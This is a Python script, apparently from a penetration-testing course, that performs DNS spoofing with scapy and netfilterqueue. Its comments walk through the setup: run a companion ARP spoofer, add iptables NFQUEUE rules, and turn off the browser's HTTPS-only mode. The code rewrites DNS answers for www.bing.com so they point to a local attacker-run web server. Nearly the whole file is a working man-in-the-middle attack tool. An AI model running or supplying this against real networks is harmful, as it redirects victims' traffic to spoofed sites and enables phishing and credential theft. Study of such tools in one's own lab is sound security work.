# 1-to make net_cut work, you must first run the arp_spoofer,
#  make sure to read instruction in .py file

# 2-in terminal run >> sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
# then run this program

# 3-to finish clear the iptables created by the terminal command iptables 
# >> sudo iptables --flush

# 4-to run this program on your local computer the iptables cmd must be modified.
# You must execute the next 2 following cmds:
# >> sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
# >> sudo iptables -I INPUT -j NFQUEUE --queue-num 0
# >> go to firefox browser and go to about:config. Make sure dom.security.https_only_mode is set to false
# >> go to /etc/apache2/sites-availables/apache2.conf and enter the website as ServerName www.bing.com
# then you will be able to run this program against your own computer
#*don't forget to run sudo iptables --flush in order to access the internet again*

#  To start the webserver in kali >> sudo systemctl start apache2 , and then stop when you are done

# install sudo apt install python3-netfilterqueue
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname.decode():
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname= qname, rdata= "192.168.60.2")
            # Modify the answer of the received dns input request
            scapy_packet[scapy.DNS].an = answer
            #  modify the number of answers to matche the 1 you created 
            scapy_packet[scapy.DNS].ancount = 1
            # Delete chksum & len fields. Scappy will recalculate these based on the values we modified.
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            # print(scapy_packet.show())
            # set the payload you created to the original packet received
            packet.set_payload(bytes(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()